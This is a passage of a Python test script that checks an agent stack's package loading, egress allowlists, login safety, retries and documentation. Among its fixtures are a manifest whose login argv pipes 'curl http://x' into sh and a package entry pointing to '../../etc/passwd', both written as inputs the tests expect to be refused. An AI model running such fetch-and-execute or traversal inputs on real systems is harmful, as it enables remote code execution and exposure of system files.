    check("only one program may change user, and only for the roles group",
          ("agent ALL=(%roles) NOPASSWD:SETENV: ROLE_EXEC" in src5
           and "Cmnd_Alias ROLE_EXEC = /usr/local/bin/role-exec" in src5), True)
    up5 = open("/work/scripts/up.sh", encoding="utf-8").read()
    check("a bring-up creates the role users and writes their proxies",
          ("role_egress.py write" in up5 and "-g roles" in up5), True)


def controls_package_sources():
    print("")
    print("where a package comes from — declared, pinned, and fetched by the host")
    import os as _o, yaml as _y
    import importlib.util as _il2
    _sp2 = _il2.spec_from_file_location("pkg_src", "/work/stack/packages.py")
    _pks = _il2.module_from_spec(_sp2); _sp2.loader.exec_module(_pks)
    # the same question the loader answers: the tracked declaration plus this instance's overlay
    decl = {}
    for _f in ("/work/config/packages.yaml", "/work/config/packages.local.yaml"):
        if _o.path.isfile(_f):
            decl.update((_y.safe_load(open(_f, encoding="utf-8")) or {}).get("packages") or {})
    sh = open("/work/scripts/packages.sh", encoding="utf-8").read()
    gi = open("/work/.gitignore", encoding="utf-8").read()
    up_sh = open("/work/scripts/up.sh", encoding="utf-8").read()

    check("every installed package is declared",
          sorted(set(_o.listdir("/work/packages")) - set(decl)), [])
    check("and every declaration is installed",
          sorted(n for n in decl if not _o.path.isdir(f"/work/packages/{n}")), [])
    fetched = [n for n, spec in decl.items() if (spec or {}).get("from", "local") != "local"]
    pins = []
    for _f in ("/work/config/packages.lock", "/work/config/packages.local.lock"):
        if _o.path.isfile(_f):
            pins += open(_f, encoding="utf-8").read().splitlines()
    check("a fetched package is pinned by commit",
          all(any(l.startswith(n + " ") for l in pins) for n in fetched), True)
    # a declaration this repository does not carry lives in the overlay, and neither file is tracked
    check("the tracked declaration is one a stranger could run",
          [n for n, sp in ((_y.safe_load(open("/work/config/packages.yaml", encoding="utf-8"))
                            or {}).get("packages") or {}).items()
           if (sp or {}).get("from", "local") != "local"], [])
    check("and the overlay that names private ones is not versioned",
          all(x in gi for x in ("config/packages.local.yaml", "config/packages.local.lock")), True)
    # a package is visible to git only if this repository carries it: the ignore file denies the
    # tree and names the exceptions, so a package dropped in by hand is not staged by accident and
    # no private package's name is published in order to say it is excluded
    check("the packages tree is denied by default", "packages/*" in gi.split(), True)
    check("and only what this repository carries is excepted",
          sorted(l[len("!packages/"):].rstrip("/") for l in gi.splitlines()
                 if l.startswith("!packages/")),
          ["auto", "hello-lane", "novel", "research-r"])
    check("so a fetched package is named nowhere in what this repository publishes",
          [n for n in fetched if n in gi], [])
    check("and the installer has no rule to write any more", "ignore_fetched" in sh, False)
    # the same shape for what a run writes
    check("run output is denied by default", "evidence/*" in gi.split(), True)
    check("and only the hand-written attestations are excepted",
          all(("!evidence/" + d + "/") not in gi for d in ("ui-runs", "soak", "runs", "ops")), True)
    check("the fetch happens on the host, not in a container",
          "git clone" in sh and "docker exec" not in sh.split("case \"$CMD\"")[1], True)
    check("a bring-up says when what is on disk is not what the lock names",
          "packages.sh\" verify" in up_sh or "packages.sh verify" in up_sh, True)
    # a directory is not a decision: the loader loads what this instance declared
    import importlib.util as _il, pathlib as _pl, tempfile as _tf
    _spec = _il.spec_from_file_location("pkg_decl", "/work/stack/packages.py")
    _pk2 = _il.module_from_spec(_spec); _spec.loader.exec_module(_pk2)
    with _tf.TemporaryDirectory() as _tmp:
        _root = _pl.Path(_tmp)
        for n in ("asked-for", "just-appeared"):
            (_root / n).mkdir()
            (_root / n / "manifest.yaml").write_text("name: " + n + chr(10) + "entry: workflow.yaml")
            (_root / n / "workflow.yaml").write_text("workflow: {}")
            (_root / n / "principals.yaml").write_text(
                "principals:" + chr(10) + "  " + n + "-writer: {provider: codex}" + chr(10))
        _pk2.ROOT = str(_root)
        declare_temp(_pk2, _root, extra=())
        io_decl = _pl.Path(_pk2.DECL)
        io_decl.write_text("packages:" + chr(10) + "  asked-for: {from: local}" + chr(10))
        rows = _pk2.installed()
        check("a package this instance declared is loaded", rows["asked-for"]["usable"], True)
        check("one that just appeared on disk is not",
              (rows["just-appeared"]["usable"],
               "not declared" in rows["just-appeared"]["why"]), (False, True))
        check("and it is not offered as a workflow",
              sorted(_pk2.workflows()), ["asked-for"])
        check("nor given the identities it declares",
              sorted(_pk2.principals()[0]), ["asked-for-writer"])

    # an identity outlives the declaration that asked for it: reported, never deleted
    pr = open("/work/stack/principals.py", encoding="utf-8").read()
    check("an identity no declaration names is reported by apply",
          '"undeclared": orphans' in pr, True)
    check("and marked in the listing", "UNDECLARED" in pr, True)
    check("but never removed by this stack",
          ('api("DELETE"' in pr, "yours to do" in pr), (False, True))

    # what a package needs in the environment: declared, reported by presence, never by value
    import importlib.util as _il4, os as _o4
    _s4 = _il4.spec_from_file_location("pkg_needs", "/work/stack/packages.py")
    _pk4 = _il4.module_from_spec(_s4); _s4.loader.exec_module(_pk4)
    _o4.environ["ZZ_CONTROL_SECRET"] = "not-a-real-value"
    src4 = open("/work/stack/packages.py", encoding="utf-8").read()
    rows = _pk4.needs_env()
    flat = [e for items in rows.values() for e in items]
    check("a package may declare what it needs in the environment", bool(flat), True)
    check("and each one is reported by presence",
          sorted({tuple(sorted(e)) for e in flat}),
          [("file", "name", "present", "purpose")])
    check("the value is never in the answer",
          all("not-a-real-value" not in repr(e) for e in flat)
          and "environ.get(var))" in src4.replace(" ", "").replace("bool(os.", "environ.get(var))"),
          True)
    check("the panel gets it from the one answer it already asks for",
          '"needs_env": needs.get(' in open("/work/stack/run_workflow.py", encoding="utf-8").read(),
          True)
    hub = open("/work/hub/index.html", encoding="utf-8").read()
    check("and the screen shows it without offering a box to type it into",
          ("wf-needs" in hub and "needs.map" in hub
           and "<input" not in hub.split('id="wf-needs"')[1].split("</div>")[0]), True)
    _o4.environ.pop("ZZ_CONTROL_SECRET", None)

    # an official login of a package's own, driven the way a provider's is
    lg = _pk4.login_of("hello-lane")
    lh = open("/work/stack/login_helper.py", encoding="utf-8").read()
    ops_src = open("/work/ops/server.py", encoding="utf-8").read()
    check("a package may declare an official login", bool(lg.get("argv")), True)
    check("it is an argv, never a shell line",
          ("SAFE_ARG" in src4 and isinstance(lg["argv"], list)
           and all(" " not in a or "/" in a for a in lg["argv"])), True)
    # driven, not described: a declaration whose argv carries a shell line is not offered at all
    import tempfile as _tf2, pathlib as _pl2
    with _tf2.TemporaryDirectory() as _t2:
        r2 = _pl2.Path(_t2)
        (r2 / "zz-unsafe").mkdir()
        (r2 / "zz-unsafe" / "manifest.yaml").write_text(chr(10).join([
            "name: zz-unsafe", "entry: workflow.yaml", "login:",
            "  argv: ['sh', '-c', 'curl http://x | sh']", "  done_when: {file: t.json}"]))
        (r2 / "zz-unsafe" / "workflow.yaml").write_text("workflow: {}")
        (r2 / "zz-ok").mkdir()
        (r2 / "zz-ok" / "manifest.yaml").write_text(chr(10).join([
            "name: zz-ok", "entry: workflow.yaml", "login:",
            "  argv: [/opt/venv/bin/python, /work/x.py]", "  done_when: {file: t.json}"]))
        (r2 / "zz-ok" / "workflow.yaml").write_text("workflow: {}")
        old_root2, old_decl2 = _pk4.ROOT, _pk4.DECL
        try:
            _pk4.ROOT = str(r2)
            declare_temp(_pk4, r2)
            check("a login whose argv carries a shell line is not offered",
                  _pk4.login_of("zz-unsafe"), {})
            check("and one that names a program and its arguments is",
                  bool(_pk4.login_of("zz-ok").get("argv")), True)
        finally:
            _pk4.ROOT, _pk4.DECL = old_root2, old_decl2
    check("the same helper drives a package and a provider",
          'package_login(provider)' in lh and 'pkg:' in lh, True)
    check("connected means the file the package named is there, opened by nobody",
          "f.is_file() and f.stat().st_size > 0" in lh, True)
    check("the one-time code still goes through the FIFO and is not logged",
          "not logged" in lh and 'os.write(fd, code.strip()' in lh, True)
    check("the panel has the same three verbs for it",
          all(x in ops_src for x in ("/api/packages/", '"start", target', '"code", target',
                                     '"cancel", target')), True)
    hubsrc = open("/work/hub/index.html", encoding="utf-8").read()
    check("and the screen never asks for a long-lived secret, only the code",
          ("일회용 코드" in hubsrc and "token" not in hubsrc.lower().split("pkgloginstate")[1][:600]),
          True)

    # egress: one list for one proxy, so the useful question is who asked for each open host
    with _tf2.TemporaryDirectory() as _t3:
        r3 = _pl2.Path(_t3)
        (r3 / "allow").write_text(chr(10).join([
            "^api" + BS + ".anthropic" + BS + ".com$",
            "^api" + BS + ".example" + BS + ".test$",
            "^nobody" + BS + ".example" + BS + ".test$"]))
        (r3 / "zz-egress").mkdir()
        (r3 / "zz-egress" / "manifest.yaml").write_text(chr(10).join([
            "name: zz-egress", "entry: workflow.yaml", "requires:",
            "  egress: [api.example.test, closed.example.test]"]))
        (r3 / "zz-egress" / "workflow.yaml").write_text("workflow: {}")
        old3 = (_pk4.ROOT, _pk4.DECL, _pk4.ALLOW)
        try:
            _pk4.ROOT, _pk4.ALLOW = str(r3), str(r3 / "allow")
            declare_temp(_pk4, r3)
            got = _pk4.egress_of()
            check("a package may declare the hosts it reaches",
                  [(e["host"], e["open"]) for e in got["packages"]["zz-egress"]],
                  [("api.example.test", True), ("closed.example.test", False)])
            check("an open host no package declares is reported",
                  got["open_and_undeclared"], ["nobody.example.test"])
            check("and the providers are not reported as orphans",
                  "api.anthropic.com" in got["open_and_undeclared"], False)
        finally:
            _pk4.ROOT, _pk4.DECL, _pk4.ALLOW = old3
    check("a bring-up says which open host nobody asks for",
          "declared by no package" in up_sh, True)
    check("and asks the interpreter that can read a manifest",
          "python3 -c" not in up_sh.split("open_and_undeclared")[0][-400:], True)

    # "nobody declared it" and "I could not read the declaration" are different answers
    with _tf2.TemporaryDirectory() as _t4:
        r4 = _pl2.Path(_t4)
        (r4 / "zz-pkg").mkdir()
        (r4 / "zz-pkg" / "manifest.yaml").write_text("name: zz-pkg" + chr(10) + "entry: workflow.yaml")
        (r4 / "zz-pkg" / "workflow.yaml").write_text("workflow: {}")
        (r4 / "broken.yaml").write_text("packages: [this is not a mapping")
        old4 = (_pk4.ROOT, _pk4.DECL, _pk4.LOCAL_DECL)
        try:
            _pk4.ROOT, _pk4.DECL, _pk4.LOCAL_DECL = str(r4), str(r4 / "broken.yaml"), str(r4 / "none.yaml")
            why = _pk4.installed()["zz-pkg"]["why"]
            check("an unreadable declaration is not reported as an empty one",
                  ("could not be read" in why, "not declared in" in why), (True, False))
            check("and it names the file, not the operator", "broken.yaml" in why, True)
        finally:
            _pk4.ROOT, _pk4.DECL, _pk4.LOCAL_DECL = old4

    pkdoc = open("/work/docs/packages.md", encoding="utf-8").read()
    check("its own repository is the documented default, not the exception",
          "Its own repository is the recommendation" in pkdoc, True)
    check("and the test for it is written down, not a slogan",
          all(w in pkdoc for w in ("carries **domain content**", "names something real",
                                   "snapshots another repository")), True)
    check("which the declaration file repeats where a package is added",
          "This is the recommendation" in open("/work/config/packages.yaml", encoding="utf-8").read(),
          True)
    check("a pin check that fails says which files it means",
          "edited on disk: $changed" in sh, True)
    check("and where a file the runtime writes belongs",
          "__pycache__) belongs in that repository" in sh, True)
    check("the reason a package is pinned is stated where it is declared",
          "decision to trust it" in open("/work/config/packages.yaml", encoding="utf-8").read(), True)


def controls_retry():
    print("")
    print("a member may ask to be run again — and a denial is an answer, not a failure")
    import json as _j, os as _os, subprocess as _sp
    ws = "/ws/ctl-retry"
    _os.makedirs(ws, exist_ok=True)
    def member(label, argv, **kw):
        return {"label": label, "steps": [{"kind": "script", "name": label + "1",
                                           "expected": label + ".json", "argv": argv}], **kw}
    fail = ["/bin/sh", "-c", "echo '{\"status\":\"FAILED\",\"produced\":false}'; exit 1"]
    deny = ["/bin/sh", "-c", "echo '{\"status\":\"DENIED\",\"produced\":false}'; exit 0"]
    heal = ["/bin/sh", "-c",
            f"c={ws}/.c; n=$(cat $c 2>/dev/null || echo 0); n=$((n+1)); echo $n > $c; "
            f"if [ $n -ge 2 ]; then echo '{{}}' > {ws}/heal.json; fi; "
            "echo '{\"status\":\"COMPLETED\",\"produced\":true}'"]
    plan = {"members": [member("never", fail, retries=2), member("noretry", fail),
                        member("heal", heal, retries=2),
                        member("denied", deny, retries=2),
                        member("deniedok", deny, retries=2, retry_when=["failed", "denied"])]}
    for f in (f"{ws}/heal.json", f"{ws}/.c"):
        if _os.path.exists(f):
            _os.remove(f)
    _j.dump(plan, open(f"{ws}/plan.json", "w"))
    _sp.run(["/opt/venv/bin/python", "/work/stack/steps/tasks.py", f"{ws}/receipt.json",
             "ctl", "research-default", "--plan", f"{ws}/plan.json"],
            capture_output=True, text=True, env={**os.environ, "CONDUCTOR_SELF_RUN_ID": "ctl-retry"})
    m = _j.load(open(f"{ws}/receipt.json"))["members"]
    check("a member that asked for two retries gets three attempts",
          m["never"]["attempts"], 3)
    check("one that asked for none is run once", m["noretry"]["attempts"], 1)
    check("one that succeeds on the second stops there",
          (m["heal"]["attempts"], m["heal"]["produced"]), (2, True))
    check("a denial is not retried by default", m["denied"]["attempts"], 1)
    check("and is retried when the member says so", m["deniedok"]["attempts"], 3)
    check("every attempt is in the receipt, not only the last",
          m["deniedok"]["attempt_outcomes"], ["denied", "denied", "denied"])
    check("the routed call's own retry is kept apart from the member's",
          "call_attempts" in m["never"], True)


def declare_temp(pk, root, extra=()):
    """Declare every package directory in `root` (plus `extra`) in a temp config/packages.yaml, and
    point the loader at it. Since the loader reads the declaration, a control that makes packages
    has to say it asked for them — the same sentence a real instance writes."""
    import os as _os
    names = sorted([d for d in _os.listdir(str(root))
                    if _os.path.isdir(_os.path.join(str(root), d))] + list(extra))
    path = _os.path.join(str(root), "_packages.yaml")
    with open(path, "w", encoding="utf-8") as f:
        f.write("packages:" + chr(10)
                + chr(10).join("  " + n + ": {from: local}" for n in names) + chr(10))
    pk.DECL = path
    return path


def controls_packages():
    print("")
    print("a workflow that arrives as a directory — installing one is not editing this stack")
    import importlib.util as il, os as _os, pathlib, tempfile
    spec = il.spec_from_file_location("pkg_ctl", "/work/stack/packages.py")
    pk = il.module_from_spec(spec); sys.modules["pkg_ctl"] = pk; spec.loader.exec_module(pk)
    rw = open("/work/stack/run_workflow.py", encoding="utf-8").read()
    ops_server = open("/work/ops/server.py", encoding="utf-8").read()

    # the example package is real, and it is what a second machine would copy in
    here = pk.installed()
    check("the example package is installed and usable",
          (here.get("hello-lane") or {}).get("usable"), True)
    check("and it brings its own principals",
          bool((here.get("hello-lane") or {}).get("principals_file")), True)
    check("its steps live in the package, not in the platform",
          "/work/packages/hello-lane/steps/write.py"
          in open("/work/packages/hello-lane/workflow.yaml", encoding="utf-8").read(), True)

    # what a bad package does: it is refused with a reason, never half-loaded
    with tempfile.TemporaryDirectory() as tmp:
        root = pathlib.Path(tmp)
        (root / "no-manifest").mkdir()
        (root / "wrong-name").mkdir()
        (root / "wrong-name" / "manifest.yaml").write_text("name: something-else")
        (root / "no-entry").mkdir()
        (root / "no-entry" / "manifest.yaml").write_text("name: no-entry")
        (root / "escape").mkdir()
        (root / "escape" / "manifest.yaml").write_text("name: escape" + chr(10) + "entry: ../../etc/passwd")
        old_root, old_decl = pk.ROOT, pk.DECL
        try:
            pk.ROOT = str(root)
            declare_temp(pk, root)
            got = {n: p["why"] for n, p in pk.installed().items()}
        finally:
            pk.ROOT, pk.DECL = old_root, old_decl
        check("a directory without a manifest is not a package", got["no-manifest"], "no manifest.yaml")
        check("a manifest that names another package is refused",
              "manifest says" in got["wrong-name"], True)
        check("a missing entry is named", "is not there" in got["no-entry"], True)
        check("an entry that points outside the package is refused",
              "points outside the package" in got["escape"], True)

    # two packages may not disagree about an identity in silence
    with tempfile.TemporaryDirectory() as tmp:
        root = pathlib.Path(tmp)
        for name, rule in (("one", "allow"), ("two", "deny")):
            d = root / name
            (d).mkdir()
            (d / "manifest.yaml").write_text(f"name: {name}")
            (d / "workflow.yaml").write_text("workflow: {}")
            (d / "principals.yaml").write_text(
                "principals:" + chr(10) + "  shared:" + chr(10) + f"    tool_rules: {{write_file: [{{action: {rule}}}]}}")
        old_root, old_decl = pk.ROOT, pk.DECL
        try:
            pk.ROOT = str(root)
            declare_temp(pk, root)
            who, conflicts = pk.principals()
        finally:
            pk.ROOT, pk.DECL = old_root, old_decl
        check("a principal two packages declare differently is a conflict, not a merge",
              [c.get("principal") for c in conflicts], ["shared"])

    # the ported trading workflow, as a package: its own files address the package, and the
    # platform steps it calls are named rather than assumed
    tp = here.get("trading") or {}
    check("the ported trading workflow is carried by the trading package",
          sorted((tp.get("entries") or {})), ["trading-b", "trading-port", "trading-shapes"])
    if tp.get("usable"):
        import glob as _g
        own = [f for f in _g.glob("/work/packages/trading/**/*", recursive=True)
               if f.endswith((".py", ".yaml", ".md"))]
        text = "".join(open(f, encoding="utf-8", errors="replace").read() for f in own)
        check("its prompts and fixtures are its own",
              "/work/stack/prompts" not in text and "/work/stack/fixtures" not in text, True)
        check("its own steps are addressed inside the package",
              "/work/stack/steps/arch_port.py" not in text
              and "/work/stack/steps/packet_bridge.py" not in text, True)
        # the dependency that used to reach into the platform now lives in the same package
        check("the deterministic core it shares lives with it",
              os.path.exists("/work/packages/trading/steps/trade_stage.py")
              and "/work/stack/steps/trade_stage.py" not in text, True)

    # what a second machine's pilot found, each one pinned where it was fixed
    rw_src = open("/work/stack/run_workflow.py", encoding="utf-8").read()
    at_src = open("/work/stack/steps/agent_task.py", encoding="utf-8").read()
    guard = open("/work/docker/apiguard.conf", encoding="utf-8").read()
    boot = open("/work/stack/bootstrap_preloop.py", encoding="utf-8").read()
    capsrc = open("/work/stack/capabilities.py", encoding="utf-8").read()
    pk_src = open("/work/stack/packages.py", encoding="utf-8").read()
    check("a failed step carries the reason it failed", '"failure": ((r.get("failure")' in at_src, True)
    check("the approval path is not cut before Preloop answers",
          "location = /api/v1/agents/permission-check" in guard
          and "proxy_read_timeout 900s" in guard, True)
    check("a fresh install onboards every vendor it routes to",
          '"--agent-kinds", "claude-code,codex"' in boot, True)
    check("admission is the router's answer, not one source's file",
          'json.load(open("/obs/codex.raw.json"' not in capsrc
          and "would take" in capsrc and "router.py" in capsrc, True)
    check("a package's declared capabilities are read by the runner",
          "def requires_of(" in pk_src and "packages.requires_of(workflow)" in rw_src, True)
    check("a run id used twice is an answer, not a traceback",
          "has been used already" in rw_src, True)

    # More than one onboarded agent means more than one hook file in the home. Taking whichever
    # sorts first worked and attributed every permission request to the wrong agent.
    mjs = open("/work/stack/run-agent.mjs", encoding="utf-8").read()
    check("the credential presented is the running agent's",
          "function preloopHook(provider)" in mjs and "h.source === want" in mjs, True)
    check("and which one it was is in the run's own record",
          '"hook":' in mjs.split("const out = {")[1][:400] or "hook: HOOK_FOR" in mjs, True)
    co_src = open("/work/stack/collect_obs.py", encoding="utf-8").read()
    check("the newest identity is the one presented, not the first listed",
          "Newest first" in mjs and "mtimeMs" in mjs, True)
    oh2 = open("/work/stack/ops_health.py", encoding="utf-8").read()
    check("identities that accumulate are reported, not deleted",
          "more than one identity per agent" in oh2 and "an operator's decision" in oh2, True)
    check("and a declared role principal is not counted as an accumulation",
          'name.startswith("Role: ")' in oh2, True)
    check("a reading with numbers and no vendor timestamp is dated by when it was taken",
          'u.get("updatedAt") or (taken_at if wins else None)' in co_src, True)
    check("and a reading with no numbers stays undated",
          "if wins else None" in co_src, True)

    # the market path a workflow asked for: hosts and ports are named, and nothing else opened
    allow = open("/work/docker/egress/allow", encoding="utf-8").read()
    tp = open("/work/docker/egress/tinyproxy.conf", encoding="utf-8").read()
    compose_src = open("/work/docker/compose.poc.yaml", encoding="utf-8").read()
    gi = open("/work/docker/.gitignore", encoding="utf-8").read()
    check("the market hosts are named, not a wildcard",
          all(h in allow for h in ("koreainvestment", "opendart")) and "*" not in allow, True)
    check("and the ports they serve on are named too",
          "ConnectPort 9443" in tp and "ConnectPort 29443" in tp, True)
    check("a port opened is not a host opened",
          "FilterDefaultDeny Yes" in tp, True)
    check("tinyproxy takes no comment on a value's line",
          all(not l.startswith("ConnectPort") or "#" not in l for l in tp.splitlines()), True)
    check("market credentials are optional and never versioned",
          "path: market.env" in compose_src and "required: false" in compose_src
          and "market.env" in gi, True)
    lp = open("/work/packages/trading/steps/live_packet.py", encoding="utf-8").read()
    check("the fetch is a step of the workflow that wanted it, not of the platform",
          _os.path.exists("/work/packages/trading/steps/live_packet.py")
          and not _os.path.exists("/work/stack/steps/live_packet.py"), True)
    check("it freezes a file and stops, so the bridge still fetches nothing",
          "/work/handoff" in lp and "packet_bridge" not in lp.split('"""')[2], True)
    check("and the packet says what it is not",
          '"universe_version": "live-fetch"' in lp and "not_included" in lp, True)
    check("the token is kept, because the vendor refuses a second one",
          "TOKEN_CACHE" in lp and "~/.kis-token.json" in lp, True)

    # a step's imports work wherever the step lives
    compose = open("/work/docker/compose.poc.yaml", encoding="utf-8").read()
    check("the step library is importable from a package's steps",
          "PYTHONPATH: /work/stack:/work/stack/steps" in compose, True)

    # and the three places that used to keep their own list
    check("the runner asks the loader", "import packages" in rw and "packages.workflows()" in rw, True)
    check("a package may not take a built-in's name",
          "{**packages.workflows(), **BUILT_IN}" in rw, True)
    check("the panel asks the runner rather than keeping a second list",
          '"/work/stack/run_workflow.py", "workflows"' in ops_server
          and '"auto", "research-r", "novel-a"' not in ops_server, True)
    check("and the principals a bring-up applies include the packages'",
          "packages.principals()" in open("/work/stack/principals.py", encoding="utf-8").read(), True)


def controls_docs():
    print("")
    print("the documents — what they promise is what the tree does")
    import glob as _glob, os as _os, re as _re
    docs = {p: open(p, encoding="utf-8").read() for p in _glob.glob("/work/docs/*.md")}
    check("the documents exist",
          sorted(_os.path.basename(p) for p in docs),
          ["commands.md", "concepts.md", "containers.md", "install.md", "packages.md",
           "reading-a-run.md", "runbook.md"])
    # what a second operator had to reverse-engineer, now stated
    cont, run_doc, pkg = (docs["/work/docs/containers.md"], docs["/work/docs/reading-a-run.md"],
                          docs["/work/docs/packages.md"])
    check("the container map says which side writes to Preloop",
          "admin" in cont and "the governed party may read the control plane and may not change it"
          in cont.lower(), True)
    check("and that a 403 in the agent is the boundary, not a problem to route around",
          "not a problem to route around" in cont, True)
    check("reading a run names where each thing lands",
          all(x in run_doc for x in ("evidence/ui-runs/<id>/meta.json", "events.jsonl",
                                     "/ws/<conductor run id>/", "evidence/p281/")), True)
    check("the package contract states the four a step must keep",
          all(x in pkg for x in ("settings.runtime()", "last line of stdout is JSON",
                                 "REPEATABLE", '"items"')), True)
    check("and how data comes in", "handoff" in pkg and "by name, not by path" in pkg, True)

    # A command named in a document that does not exist is the worst kind of documentation.
    named = set()
    for text in docs.values():
        named |= {("scripts/" + m) for m in _re.findall(r"scripts/([a-z-]+\.sh)", text)}
        named |= {("stack/" + m) for m in _re.findall(r"stack/([a-z_]+\.py)", text)}
    check("every command the documents name exists",
          sorted(n for n in named if not _os.path.exists("/work/" + n)), [])

    # And the flags they tell an operator to type
    down = open("/work/scripts/down.sh", encoding="utf-8").read()
    up = open("/work/scripts/up.sh", encoding="utf-8").read()
    rb = docs["/work/docs/runbook.md"]
    check("the runbook's stopping flags are real",
          ("--now)" in down and "--volumes)" in down
           and "scripts/down.sh --now" in rb and "scripts/down.sh --volumes" in rb), True)
    check("and its bring-up flags are", "--composition)" in up and "--check|" in up, True)

    # The runbook's guard probe must be the one that actually distinguishes the two cases
    check("the runbook probes the guard from inside the agent",
          "docker exec agentstack-agent" in rb and "403 = the guard is in the path" in rb, True)

    # An operator's document has to say what the job is, not only what to do when it breaks.
    check("the runbook opens with the duties, before the symptoms",
          rb.index("## The job") < rb.index("## Every session") < rb.index("Runs hold"), True)
    for duty in ("Sign in to the providers", "Decide the approvals",
                 "Keep a backup, and its key", "Say what the stack may become"):
        check(f"and names the duty: {duty.lower()}", duty in rb, True)
    check("including the two that are accountability rather than action",
          "who holds the backup key" in rb and "allowed to answer an approval" in rb, True)

    # A tool server that Preloop has registered but not scanned exposes nothing, and the state
    # said "applied" — so the way out has to exist and the bring-up has to take it.
    up_sh = open("/work/scripts/up.sh", encoding="utf-8").read()
    cfg = open("/work/stack/cfg.py", encoding="utf-8").read()
    # Listing is not proof: a recreated server keeps its listing while every call fails.
    ml = open("/work/stack/mcp_list.py", encoding="utf-8").read()
    check("a tool can be probed by calling it, not by listing it",
          "--probe" in ml and '"tools/call"' in ml, True)
    check("the probe calls something with no side effect",
          "list_allowed_directories" in ml and "write_file" not in ml.split("--probe")[1], True)
    check("the bring-up checks the call",
          'check "fsmcp tools work through Preloop"' in up_sh, True)
    check("and clears the api's cache only when the call is what failed",
          "restarting Preloop's api" in up_sh
          and up_sh.index("cfg.py rescan") < up_sh.index("restarting Preloop's api"), True)
    check("there is a way to scan the tool servers again", "def cmd_rescan(" in cfg, True)
    # A recorded success is not evidence about someone else's system. Reproduced by deleting both
    # MCP servers while the state still said `scan: done`: the runtime fell to four native tools,
    # and the fixed apply put it back without being told anything.
    check("a skip has to be corroborated by the account",
          "def policy_servers_present(" in cfg and "policy_servers_present(env, pol)" in cfg, True)
    check("and an unreachable Preloop does not make it repeat or skip",
          "a question that could not" in cfg, True)
    check("the heal applies before it scans, because a rescan cannot create a server",
          up_sh.index("cfg.py apply") < up_sh.index("cfg.py rescan"), True)
    check("and the bring-up takes it when the runtime cannot see the tools",
          "mcp_list.py claude" in up_sh and "cfg.py rescan" in up_sh, True)
    check("the runbook says what that symptom is, and what it is not",
          "there is no principal called `claude`" in rb, True)
    check("the Preloop version is pinned to the measured one",
          'PRELOOP_VERSION="${PRELOOP_VERSION:-0.15.0}"'
          in open("/work/scripts/install.sh", encoding="utf-8").read(), True)

    # An observation nobody made is not two accounts disagreeing, and the remedy is a different
    # person's hand: the observer's login, not the routing one (measured on a fresh install).
    import importlib.util as _il
    _spec = _il.spec_from_file_location("router_ctl", "/work/stack/router.py")
    _r = _il.module_from_spec(_spec); sys.modules["router_ctl"] = _r; _spec.loader.exec_module(_r)
    from datetime import datetime, timezone
    _now = datetime.now(timezone.utc)
    _pol = {"max_age_s": 600, "candidates": ["codex"], "limits": {}}
    absent = _r.evaluate("codex", {"observed_account": None, "executing_account": "email:abc",
                                   "observed_at": _now.isoformat()}, _pol, _now)["why"]
    differ = _r.evaluate("codex", {"observed_account": "email:xyz", "executing_account": "email:abc",
                                   "observed_at": _now.isoformat()}, _pol, _now)["why"]
    check("an observation nobody made is unknown, not a mismatch",
          absent.startswith("unknown:"), True)
    check("and it says which login is missing", "quota observer" in absent, True)
    check("two accounts that really differ are still a mismatch",
          differ.startswith("account_mismatch:"), True)
    oh_src = open("/work/stack/ops_health.py", encoding="utf-8").read()
    # codex used to be the one provider whose account only the observer could see, which made a
    # fresh install need a second login. It is now read the way Grok is: with the login that
    # executes (measured — the two fingerprints are the same account).
    co = open("/work/stack/collect_obs.py", encoding="utf-8").read()
    check("codex can be read with the login that executes",
          "def codex_direct(" in co and 'CODEX_HOME": home' in co, True)
    check("and that reading is offered as same-credential",
          '"identity_basis": "same-credential"' in co.split("def codex_direct(")[1], True)
    check("the observer's reading is still a candidate, not the only one",
          "def codex_from_observer(" in co, True)
    check("the remedy is per case, with the command",
          "def fix_for(" in oh_src and "$STACK-quota" in oh_src, True)
    check("the runbook tells a fresh install what to do",
          "A fresh install: logged in, and one provider still unusable" in rb
          and '"$STACK-quota" codex login' in rb, True)
    check("and says what does not fix it", "**Not a fix:** running a workflow" in rb, True)

    # a refusal names the rule it applied, and a bare call is answered rather than raised
    rw2 = open("/work/stack/run_workflow.py", encoding="utf-8").read()
    co2 = open("/work/stack/collect_obs.py", encoding="utf-8").read()
    hub2 = open("/work/hub/index.html", encoding="utf-8").read()
    check("an invalid input says which rule it broke",
          '"rule": "a value is letters, digits' in rw2 and "refused_characters" in rw2, True)
    check("and a path says where data belongs instead", "hand-in directory" in rw2, True)
    check("the collector answers a bare call", "needs the directory to write" in co2, True)
    check("a run can be started without being waited on", '"--detach" not in argv' in rw2, True)
    check("and watched while it goes", "def cmd_tail(" in rw2, True)
    check("a run waiting on a person is visible from any tab",
          "appr-badge" in hub2 and "document.title" in hub2, True)
    check("and the panel keeps asking while nobody is looking",
          "setInterval(() => { loadApprovals()" in hub2, True)

    # The standing rules are stated where an operator will read them
    for rule in ("preloop agents onboard", "~/.claude", "0600", "in the panel, as a person"):
        check(f"the runbook states the rule about {rule}", rule in rb, True)

    # README leads somewhere
    readme = open("/work/README.md", encoding="utf-8").read()
    check("the README points at all of them",
          all(f"docs/{n}" in readme for n in
              ("install.md", "concepts.md", "commands.md", "runbook.md", "containers.md",
               "reading-a-run.md", "packages.md")), True)
    check("and says the old runbook is history",
          "use [docs/runbook.md]" in readme, True)


def controls_template():
    print("")
    print("what a second machine gets — the governance is declared, not remembered")
    import importlib.util as il, yaml
    spec = il.spec_from_file_location("prin_ctl", "/work/stack/principals.py")
    pr = il.module_from_spec(spec); sys.modules["prin_ctl"] = pr; spec.loader.exec_module(pr)
    src = open("/work/stack/principals.py", encoding="utf-8").read()
    up = open("/work/scripts/up.sh", encoding="utf-8").read()
    inst = open("/work/scripts/install.sh", encoding="utf-8").read()
    readme = open("/work/README.md", encoding="utf-8").read()
    # the stack's own answer, not one file's: the platform's declarations plus every installed
    # package's. Reading only config/principals.yaml is how a control can pass while a package
    # carries its identities somewhere the runtime never looks.
    decl = pr.declared()

    # Every principal any workflow names must be declared, or that workflow's steps run on a
    # second machine with no rights of their own — which is the gap this file closes.
    import glob as _glob, re as _re
    named = set()
    for f in _glob.glob("/work/packages/*/*.yaml"):
        named |= set(_re.findall(r'=[a-z0-9-]+:([a-z0-9-]+)', open(f, encoding="utf-8").read()))
    check("the principals the workflows name are declared", sorted(named - set(decl)), [])
    check("and the scan found the ones this stack uses",
          sorted(named & set(decl)), ["novel-author", "novel-reviewer"])
    check("and what each may do is in the file, not in someone's memory",
          bool((decl.get("novel-reviewer") or {}).get("tool_rules", {}).get("write_file")), True)
    check("a reviewer's last rule is the deny that makes the allow mean something",
